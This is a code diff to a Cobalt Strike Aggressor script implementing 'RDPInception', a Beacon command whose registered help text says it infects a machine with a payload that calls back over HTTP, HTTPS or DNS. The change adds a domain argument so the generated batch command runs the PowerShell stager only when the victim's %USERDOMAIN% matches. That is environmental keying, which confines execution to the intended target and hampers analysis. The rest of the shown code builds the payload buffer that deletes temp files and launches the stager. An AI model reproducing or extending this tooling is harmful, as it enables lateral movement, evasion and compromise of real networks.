@@ -4,12 +4,12 @@
 
 
 alias rdpinception {
-
-	rdpincept($1);
+	rdpincept($1,$2);
 }
 
 sub rdpincept {
    	$beacon = $1;
+   	$domain = $2;
    	# Force select a payload
     openPayloadHelper(lambda({
         $listener = $1;
@@ -40,7 +40,15 @@ sub rdpincept {
 
 		$buffer = $buffer . "del /q %TEMP%\\temp_00.txt >nul 2>&1\r\n";
 
-        $buffer = $buffer . powershell($listener, false);
+		# Keying by Domain
+
+		if ($domain){
+			$buffer = $buffer . "If \"" . $domain . "\"==\"%USERDOMAIN%\" (";
+        	$buffer = $buffer . powershell($listener, false) . ")";
+        }
+        else{
+        	$buffer = $buffer . powershell($listener, false);
+        }
 
         blog($beacon, $buffer);
         
@@ -56,5 +64,5 @@ sub rdpincept {
 }
 
 beacon_command_register("rdpinception", "Infects the machine with RDPInception",
-	"Synopsis: rdpinception\n\n" .
+	"Synopsis: rdpinception [DOMAIN Key]\n\n" .
 	"Infects the machine with RDPInception, a HTTP, HTTPS or DNS payload that can egress is recommended.");
